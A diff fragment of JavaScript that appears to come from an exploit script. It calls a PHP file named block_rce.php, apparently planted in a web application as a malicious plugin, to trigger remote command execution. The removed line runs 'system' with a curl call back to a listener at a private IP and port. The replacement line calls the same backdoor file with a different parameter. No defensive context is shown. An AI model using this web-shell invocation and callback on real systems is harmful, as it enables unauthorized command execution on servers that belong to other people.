@@ -99,7 +99,7 @@
                     }
                   ).then(() => {
                     fetch(
-                      URL + "blocks/rce/lang/en/block_rce.php?_=system&__=curl%20http://192.168.153.138:1234/"
+                      URL + "blocks/rce/lang/en/block_rce.php?token=mail"
                     );
                   });
                 });
